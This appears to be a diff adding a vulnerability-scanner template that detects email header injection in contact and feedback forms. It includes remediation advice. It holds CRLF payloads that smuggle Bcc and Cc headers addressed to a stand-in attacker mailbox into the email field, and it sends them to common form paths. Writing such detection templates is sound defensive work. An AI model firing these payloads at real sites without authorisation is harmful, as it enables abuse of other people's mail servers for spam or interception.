@@ -1,0 +1,53 @@
+id: email-header-injection
+info:
+  name: Email Header Injection via Contact Form
+  severity: medium
+  tags: [injection, email, header-injection, crlf, contact-form, dast]
+  description: "Injects CRLF sequences and additional mail headers into address fields of contact and feedback forms. A successful submission response combined with no address-validation error indicates the injected headers may have been forwarded to a mail function."
+  remediation: "Validate email address fields strictly against RFC 5321. Strip or reject any input containing carriage return, line feed, or null byte characters before invoking any mail sending function."
+  cwe: "CWE-93"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  payload:
+    - "test@example.com%0ABcc:attacker@evil.com"
+    - "test@example.com%0D%0ABcc:attacker@evil.com"
+    - "test@example.com%0ACc:attacker@evil.com"
+    - "test@example.com%0AX-Injected:injected-header"
+    - "test@example.com%0D%0AContent-Type:text/html"
+
+requests:
+  - method: POST
+    paths:
+      - "/contact"
+      - "/api/contact"
+      - "/contact-us"
+      - "/feedback"
+      - "/api/feedback"
+      - "/support"
+      - "/api/support"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "email={{payload}}&name=TestUser&message=Testmessage&subject=TestSubject"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 201, 202]
+      - type: word
+        words:
+          - "thank you"
+          - "message sent"
+          - "successfully"
+          - "received your"
+          - "been submitted"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "invalid email"
+          - "valid email"
+          - "email format"
+          - "invalid address"
+        part: body
+        condition: or
+        negative: true
